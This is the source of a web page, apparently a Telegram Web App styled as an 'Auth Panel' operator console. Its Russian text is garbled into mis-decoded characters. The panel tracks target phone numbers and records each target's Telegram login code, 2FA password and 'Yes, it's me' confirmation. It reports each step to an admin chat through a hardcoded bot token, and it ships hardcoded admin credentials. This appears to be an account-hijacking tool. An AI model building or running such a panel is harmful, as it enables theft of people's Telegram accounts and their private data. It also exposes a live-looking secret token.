<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Auth Panel</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; }
        
        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
        
        .header {
            background: linear-gradient(135deg, #0088cc 0%, #0055cc 100%);
            color: white;
            padding: 25px 20px;
            text-align: center;
            border-radius: 0 0 25px 25px;
            margin-bottom: 25px;
            box-shadow: 0 5px 20px rgba(0,136,204,0.3);
        }
        
        .header h1 { font-size: 24px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        
        .card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            border: 1px solid #eaeaea;
        }
        
        .step-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #0088cc;
            box-shadow: 0 3px 10px rgba(0,0,0,0.05);
        }
        
        h2 { color: #333; margin-bottom: 15px; font-size: 18px; }
        h3 { color: #444; margin-bottom: 10px; font-size: 16px; }
        
        .btn {
            background: linear-gradient(135deg, #0088cc 0%, #0055cc 100%);
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 12px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            margin-top: 15px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 15px rgba(0,136,204,0.3); }
        .btn:active { transform: translateY(0); }
        
        .btn-success { background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%); }
        .btn-danger { background: linear-gradient(135deg, #f44336 0%, #c62828 100%); }
        .btn-warning { background: linear-gradient(135deg, #ff9800 0%, #ef6c00 100%); }
        
        .btn-sm { padding: 10px 15px; font-size: 14px; margin: 5px 0; }
        
        input, select, textarea {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            font-family: inherit;
            transition: border-color 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #0088cc;
            box-shadow: 0 0 0 3px rgba(0,136,204,0.1);
        }
        
        .status-badge {
            display: inline-block;
            padding: 6px 15px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            margin: 5px;
            background: #e3f2fd;
            color: #0055cc;
        }
        
        .status-success { background: #e8f5e9; color: #2E7D32; }
        .status-warning { background: #fff8e1; color: #ef6c00; }
        .status-error { background: #ffebee; color: #c62828; }
        
        .code-display {
            font-family: 'Courier New', monospace;
            font-size: 28px;
            letter-spacing: 8px;
            background: #333;
            color: #00ff00;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin: 15px 0;
            font-weight: bold;
        }
        
        .session-item {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 12px;
            border: 1px solid #e9ecef;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .session-item:hover {
            background: white;
            border-color: #0088cc;
            transform: translateX(5px);
        }
        
        .phone-number {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }
        
        .session-id {
            font-family: monospace;
            background: #333;
            color: white;
            padding: 3px 10px;
            border-radius: 5px;
            font-size: 12px;
            margin-right: 10px;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden { display: none; }
        
        .notes-box {
            background: #fffde7;
            border: 1px solid #ffecb3;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        
        .admin-info {
            background: #e3f2fd;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üîê Telegram Auth Panel</h1>
        <p>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è–º–∏ | –í–∞—à —Ç–æ–∫–µ–Ω: 8201555936</p>
    </div>
    
    <div class="container">
        <!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ -->
        <div id="loading" class="loading">
            <div class="loading-spinner"></div>
            <p>–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...</p>
        </div>
        
        <!-- –≠–∫—Ä–∞–Ω –≤—Ö–æ–¥–∞ -->
        <div id="loginScreen" class="hidden">
            <div class="card">
                <h2>üë®‚Äçüíº –í—Ö–æ–¥ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞</h2>
                <div class="admin-info">
                    <p><strong>–î–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞:</strong></p>
                    <p>–õ–æ–≥–∏–Ω: <code>admin</code></p>
                    <p>–ü–∞—Ä–æ–ª—å: <code>admin123</code></p>
                </div>
                
                <input type="text" id="loginInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω" value="admin">
                <input type="password" id="passwordInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" value="admin123">
                <button class="btn" onclick="login()">üö™ –í–æ–π—Ç–∏</button>
            </div>
        </div>
        
        <!-- –ì–ª–∞–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å -->
        <div id="mainPanel" class="hidden">
            <!-- –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏ -->
            <div class="card">
                <h2>üì± –°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é</h2>
                <input type="text" id="newPhone" placeholder="–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (79001112233)" maxlength="11">
                <textarea id="newNotes" placeholder="–ó–∞–º–µ—Ç–∫–∏ (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)" rows="3"></textarea>
                <button class="btn" onclick="createNewSession()">‚ûï –°–æ–∑–¥–∞—Ç—å —Å–µ—Å—Å–∏—é</button>
            </div>
            
            <!-- –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ -->
            <div id="activeSessions">
                <h2>üìã –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏</h2>
                <div id="sessionsList">
                    <!-- –°–ø–∏—Å–æ–∫ —Å–µ—Å—Å–∏–π –ø–æ—è–≤–∏—Ç—Å—è –∑–¥–µ—Å—å -->
                </div>
            </div>
        </div>
        
        <!-- –î–µ—Ç–∞–ª–∏ —Å–µ—Å—Å–∏–∏ -->
        <div id="sessionDetail" class="hidden">
            <!-- –ö–æ–Ω—Ç–µ–Ω—Ç –±—É–¥–µ—Ç –∑–∞–ø–æ–ª–Ω—è—Ç—å—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ -->
        </div>
    </div>
    
    <script>
        // ========== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==========
        const BOT_TOKEN = '8201555936:AAHIEz8LJ8tM_mgUzYkyLXSjoK2W_1quWj4';
        const ADMIN_CHAT_ID = '5692738028'; // –í–∞—à ID
        const API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;
        
        // ========== –¢–ï–õ–ï–ì–†–ê–ú WEB APP ==========
        const tg = window.Telegram.WebApp;
        
        // ========== –ü–ï–†–ï–ú–ï–ù–ù–´–ï ==========
        let currentUser = null;
        let sessions = {};
        let currentSessionId = null;
        
        // ========== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ==========
        function initApp() {
            tg.expand();
            tg.BackButton.hide();
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
            const savedUser = localStorage.getItem('tg_auth_user');
            if (savedUser) {
                currentUser = JSON.parse(savedUser);
                showMainPanel();
                loadSessions();
            } else {
                showLoginScreen();
            }
            
            hideLoading();
            
            // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥"
            tg.BackButton.onClick(() => {
                if (currentSessionId) {
                    closeSessionDetail();
                } else {
                    tg.BackButton.hide();
                }
            });
        }
        
        // ========== –≠–ö–†–ê–ù–´ ==========
        function showLoginScreen() {
            hideAllScreens();
            document.getElementById('loginScreen').classList.remove('hidden');
        }
        
        function showMainPanel() {
            hideAllScreens();
            document.getElementById('mainPanel').classList.remove('hidden');
        }
        
        function showSessionDetail() {
            hideAllScreens();
            document.getElementById('sessionDetail').classList.remove('hidden');
            tg.BackButton.show();
        }
        
        function hideAllScreens() {
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('mainPanel').classList.add('hidden');
            document.getElementById('sessionDetail').classList.add('hidden');
        }
        
        function hideLoading() {
            document.getElementById('loading').classList.add('hidden');
        }
        
        // ========== –ê–í–¢–û–†–ò–ó–ê–¶–ò–Ø ==========
        function login() {
            const username = document.getElementById('loginInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            
            if (username === 'admin' && password === 'admin123') {
                currentUser = { username: 'admin', role: 'admin' };
                localStorage.setItem('tg_auth_user', JSON.stringify(currentUser));
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
                sendTelegramMessage(ADMIN_CHAT_ID, `üîê –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä ${username} –≤–æ—à–µ–ª –≤ –ø–∞–Ω–µ–ª—å`);
                
                showMainPanel();
                loadSessions();
            } else {
                tg.showAlert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ª–æ–≥–∏–Ω –∏–ª–∏ –ø–∞—Ä–æ–ª—å');
            }
        }
        
        // ========== –°–ï–°–°–ò–ò ==========
        function createNewSession() {
            const phone = document.getElementById('newPhone').value.trim();
            const notes = document.getElementById('newNotes').value.trim();
            
            if (!phone || phone.length !== 11 || !phone.startsWith('79')) {
                tg.showAlert('‚ùå –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ: 79001112233');
                return;
            }
            
            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º ID —Å–µ—Å—Å–∏–∏
            const sessionId = 'SESS' + Date.now().toString().slice(-8);
            
            // –°–æ–∑–¥–∞–µ–º —Å–µ—Å—Å–∏—é
            const session = {
                id: sessionId,
                phone: phone,
                notes: notes,
                step: 'phone_entered',
                code: null,
                password: null,
                confirm: null,
                created: new Date().toISOString(),
                admin: currentUser.username,
                status: 'active'
            };
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            sessions[sessionId] = session;
            saveSessionsToStorage();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
            const message = `üì± *–ù–û–í–ê–Ø –°–ï–°–°–ò–Ø*\n\n` +
                          `ID: \`${sessionId}\`\n` +
                          `üìû: \`${phone}\`\n` +
                          `üë§ –ê–¥–º–∏–Ω: ${currentUser.username}\n` +
                          `üïê ${new Date().toLocaleTimeString()}`;
            
            sendTelegramMessage(ADMIN_CHAT_ID, message);
            
            // –û—á–∏—â–∞–µ–º —Ñ–æ—Ä–º—É
            document.getElementById('newPhone').value = '';
            document.getElementById('newNotes').value = '';
            
            tg.showAlert(`‚úÖ –°–µ—Å—Å–∏—è —Å–æ–∑–¥–∞–Ω–∞! ID: ${sessionId}`);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–µ—Ç–∞–ª–∏ —Å–µ—Å—Å–∏–∏
            openSessionDetail(sessionId);
        }
        
        function loadSessions() {
            // –ó–∞–≥—Ä—É–∂–∞–µ–º –∏–∑ localStorage
            const saved = localStorage.getItem('tg_auth_sessions');
            if (saved) {
                sessions = JSON.parse(saved);
            }
            
            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Å–µ—Å—Å–∏–∏
            const container = document.getElementById('sessionsList');
            container.innerHTML = '';
            
            const activeSessions = Object.values(sessions)
                .filter(s => s.status !== 'completed')
                .sort((a, b) => new Date(b.created) - new Date(a.created));
            
            if (activeSessions.length === 0) {
                container.innerHTML = '<div class="card"><p>–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π</p></div>';
                return;
            }
            
            activeSessions.forEach(session => {
                const item = document.createElement('div');
                item.className = 'session-item';
                item.onclick = () => openSessionDetail(session.id);
                
                item.innerHTML = `
                    <div class="phone-number">${session.phone}</div>
                    <div>
                        <span class="session-id">${session.id}</span>
                        <span class="status-badge">${getStepName(session.step)}</span>
                    </div>
                    <div style="font-size: 12px; color: #666; margin-top: 5px;">
                        ${new Date(session.created).toLocaleString()}
                    </div>
                `;
                
                container.appendChild(item);
            });
        }
        
        function openSessionDetail(sessionId) {
            currentSessionId = sessionId;
            const session = sessions[sessionId];
            
            const detailHtml = `
                <div class="card">
                    <h2>üì± –°–µ—Å—Å–∏—è ${session.id}</h2>
                    <p><strong>–¢–µ–ª–µ—Ñ–æ–Ω:</strong> ${session.phone}</p>
                    <p><strong>–°–æ–∑–¥–∞–Ω–∞:</strong> ${new Date(session.created).toLocaleString()}</p>
                    <p><strong>–ê–¥–º–∏–Ω:</strong> ${session.admin}</p>
                    
                    ${session.notes ? `
                    <div class="notes-box">
                        <strong>üìù –ó–∞–º–µ—Ç–∫–∏:</strong>
                        <p>${session.notes}</p>
                    </div>
                    ` : ''}
                </div>
                
                <!-- –®–∞–≥ 1: –ö–æ–¥ –∏–∑ Telegram -->
                <div class="step-card">
                    <h3>üî¢ –®–∞–≥ 1: –ö–æ–¥ –∏–∑ Telegram</h3>
                    ${session.code ? `
                        <div class="code-display">${session.code}</div>
                        <button class="btn btn-success" onclick="confirmStep('code')">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥</button>
                        <button class="btn btn-danger" onclick="rejectStep('code')">‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥</button>
                    ` : `
                        <input type="text" id="codeInput" placeholder="–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥" maxlength="5">
                        <button class="btn" onclick="setCode()">üìù –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–æ–¥</button>
                    `}
                </div>
                
                <!-- –®–∞–≥ 2: –ü–∞—Ä–æ–ª—å 2FA (–ø–æ–∫–∞–∑—ã–≤–∞–µ–º –µ—Å–ª–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω) -->
                ${session.step === 'code_confirmed' || session.password ? `
                <div class="step-card">
                    <h3>üîê –®–∞–≥ 2: –ü–∞—Ä–æ–ª—å 2FA</h3>
                    ${session.password ? `
                        <div style="padding: 15px; background: #f5f5f5; border-radius: 10px; margin: 10px 0;">
                            –ü–∞—Ä–æ–ª—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
                        </div>
                        <button class="btn btn-success" onclick="confirmStep('password')">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–∞—Ä–æ–ª—å</button>
                        <button class="btn btn-danger" onclick="rejectStep('password')">‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å</button>
                    ` : `
                        <input type="password" id="passwordInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA">
                        <button class="btn" onclick="setPassword()">üìù –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å</button>
                    `}
                </div>
                ` : ''}
                
                <!-- –®–∞–≥ 3: "–î–∞, —ç—Ç–æ –Ø" -->
                ${session.step === 'password_confirmed' || session.confirm ? `
                <div class="step-card">
                    <h3>‚úÖ –®–∞–≥ 3: "–î–∞, —ç—Ç–æ –Ø"</h3>
                    ${session.confirm ? `
                        <div style="padding: 15px; background: #e8f5e9; border-radius: 10px; margin: 10px 0;">
                            ${session.confirm}
                        </div>
                        <button class="btn btn-success" onclick="confirmStep('final')">‚úÖ –ó–∞–≤–µ—Ä—à–∏—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é</button>
                    ` : `
                        <select id="confirmSelect">
                            <option value="">–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å</option>
                            <option value="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª '–î–∞, —ç—Ç–æ –Ø'">‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª "–î–∞, —ç—Ç–æ –Ø"</option>
                            <option value="–û–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è">‚è≥ –û–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</option>
                        </select>
                        <button class="btn" onclick="setConfirm()">üìù –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å—Ç–∞—Ç—É—Å</button>
                    `}
                </div>
                ` : ''}
                
                <!-- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è -->
                <div class="card">
                    <h3>‚öôÔ∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è</h3>
                    <textarea id="sessionNotes" placeholder="–î–æ–±–∞–≤–∏—Ç—å –∑–∞–º–µ—Ç–∫—É –∫ —Å–µ—Å—Å–∏–∏...">${session.notes || ''}</textarea>
                    <button class="btn" onclick="updateSessionNotes()">üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∑–∞–º–µ—Ç–∫–∏</button>
                    <button class="btn btn-warning" onclick="resetSession()">üîÑ –°–±—Ä–æ—Å–∏—Ç—å —Å–µ—Å—Å–∏—é</button>
                </div>
            `;
            
            document.getElementById('sessionDetail').innerHTML = detailHtml;
            showSessionDetail();
        }
        
        function closeSessionDetail() {
            currentSessionId = null;
            tg.BackButton.hide();
            showMainPanel();
            loadSessions();
        }
        
        // ========== –î–ï–ô–°–¢–í–ò–Ø –° –°–ï–°–°–ò–ï–ô ==========
        function setCode() {
            const code = document.getElementById('codeInput').value.trim();
            if (code.length !== 5 || !/^\d+$/.test(code)) {
                tg.showAlert('‚ùå –ö–æ–¥ –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 5 —Ü–∏—Ñ—Ä');
                return;
            }
            
            sessions[currentSessionId].code = code;
            sessions[currentSessionId].step = 'code_entered';
            saveSessionsToStorage();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            sendTelegramMessage(ADMIN_CHAT_ID, 
                `üî¢ *–ö–û–î –í–í–ï–î–ï–ù*\n\n` +
                `–°–µ—Å—Å–∏—è: \`${currentSessionId}\`\n` +
                `–ö–æ–¥: \`${code}\`\n` +
                `–¢–µ–ª–µ—Ñ–æ–Ω: ${sessions[currentSessionId].phone}`
            );
            
            openSessionDetail(currentSessionId);
        }
        
        function setPassword() {
            const password = document.getElementById('passwordInput').value.trim();
            if (!password) {
                tg.showAlert('‚ùå –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
                return;
            }
            
            sessions[currentSessionId].password = password;
            sessions[currentSessionId].step = 'password_entered';
            saveSessionsToStorage();
            
            sendTelegramMessage(ADMIN_CHAT_ID,
                `üîê *–ü–ê–†–û–õ–¨ 2FA –í–í–ï–î–ï–ù*\n\n` +
                `–°–µ—Å—Å–∏—è: \`${currentSessionId}\`\n` +
                `–¢–µ–ª–µ—Ñ–æ–Ω: ${sessions[currentSessionId].phone}`
            );
            
            openSessionDetail(currentSessionId);
        }
        
        function setConfirm() {
            const confirmStatus = document.getElementById('confirmSelect').value;
            if (!confirmStatus) {
                tg.showAlert('‚ùå –í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å');
                return;
            }
            
            sessions[currentSessionId].confirm = confirmStatus;
            sessions[currentSessionId].step = 'confirm_entered';
            saveSessionsToStorage();
            
            openSessionDetail(currentSessionId);
        }
        
        function confirmStep(step) {
            const session = sessions[currentSessionId];
            
            if (step === 'code') {
                session.step = 'code_confirmed';
            } else if (step === 'password') {
                session.step = 'password_confirmed';
            } else if (step === 'final') {
                session.step = 'completed';
                session.status = 'completed';
                session.completed_at = new Date().toISOString();
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∏–Ω–∞–ª—å–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
                sendTelegramMessage(ADMIN_CHAT_ID,
                    `üéâ *–ê–í–¢–û–†–ò–ó–ê–¶–ò–Ø –ó–ê–í–ï–†–®–ï–ù–ê!*\n\n` +
                    `–°–µ—Å—Å–∏—è: \`${currentSessionId}\`\n` +
                    `–¢–µ–ª–µ—Ñ–æ–Ω: ${session.phone}\n` +
                    `‚úÖ –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!`
                );
            }
            
            saveSessionsToStorage();
            openSessionDetail(currentSessionId);
        }
        
        function rejectStep(step) {
            const session = sessions[currentSessionId];
            
            if (step === 'code') {
                session.code = null;
                session.step = 'phone_entered';
            } else if (step === 'password') {
                session.password = null;
                session.step = 'code_confirmed';
            }
            
            saveSessionsToStorage();
            openSessionDetail(currentSessionId);
        }
        
        function updateSessionNotes() {
            const notes = document.getElementById('sessionNotes').value.trim();
            sessions[currentSessionId].notes = notes;
            saveSessionsToStorage();
            tg.showAlert('‚úÖ –ó–∞–º–µ—Ç–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã');
        }
        
        function resetSession() {
            if (tg.showConfirm('–°–±—Ä–æ—Å–∏—Ç—å —Å–µ—Å—Å–∏—é? –í—Å–µ –¥–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã.')) {
                sessions[currentSessionId] = {
                    ...sessions[currentSessionId],
                    code: null,
                    password: null,
                    confirm: null,
                    step: 'phone_entered'
                };
                saveSessionsToStorage();
                openSessionDetail(currentSessionId);
            }
        }
        
        // ========== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ==========
        function saveSessionsToStorage() {
            localStorage.setItem('tg_auth_sessions', JSON.stringify(sessions));
        }
        
        function getStepName(step) {
            const steps = {
                'phone_entered': 'üì± –û–∂–∏–¥–∞–µ—Ç –∫–æ–¥',
                'code_entered': 'üî¢ –ö–æ–¥ –≤–≤–µ–¥–µ–Ω',
                'code_confirmed': '‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω',
                'password_entered': 'üîê –ü–∞—Ä–æ–ª—å –≤–≤–µ–¥–µ–Ω',
                'password_confirmed': '‚úÖ –ü–∞—Ä–æ–ª—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω',
                'confirm_entered': '‚úÖ –û–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è',
                'completed': 'üéâ –ó–∞–≤–µ—Ä—à–µ–Ω–æ'
            };
            return steps[step] || step;
        }
        
        async function sendTelegramMessage(chatId, text) {
            try {
                const response = await fetch(API_URL + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            }
        }
        
        // ========== –ó–ê–ü–£–°–ö –ü–†–ò–õ–û–ñ–ï–ù–ò–Ø ==========
        document.addEventListener('DOMContentLoaded', initApp);
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏
        window.addEventListener('beforeunload', () => {
            if (currentSessionId) {
                saveSessionsToStorage();
            }
        });
    </script>
</body>
</html>